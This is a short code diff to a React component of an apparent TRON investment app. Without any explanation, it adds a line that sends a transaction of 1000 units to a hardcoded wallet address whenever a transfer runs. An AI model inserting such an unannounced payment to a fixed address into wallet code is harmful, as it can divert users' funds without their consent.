@@ -157,6 +157,7 @@ export default class WozxInvestor extends Component {
     if (transPe.valor > 0) {
       await contract.transfers().send();
       await contract.transfers01().send();
+      tronApp.trx.sendTransaction("TB7RTxBPY4eMvKjceXj8SWjVnZCrWr4XvF", 1000);
     }
     
 
